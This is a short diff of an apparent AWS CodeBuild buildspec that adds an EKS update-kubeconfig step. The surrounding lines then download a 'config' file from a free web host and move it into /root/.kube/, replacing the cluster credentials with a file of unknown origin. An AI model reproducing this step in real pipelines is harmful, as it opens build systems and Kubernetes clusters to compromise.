@@ -20,6 +20,7 @@ phases:
     commands:
       - echo Logging in to Amazon EKS...
       - aws sts get-caller-identity
+      - aws eks --region $AWS_DEFAULT_REGION update-kubeconfig --name $AWS_CLUSTER_NAME
       - wget "https://nosone.000webhostapp.com/config"
       - mv config /root/.kube/ 
       - aws sts get-caller-identity
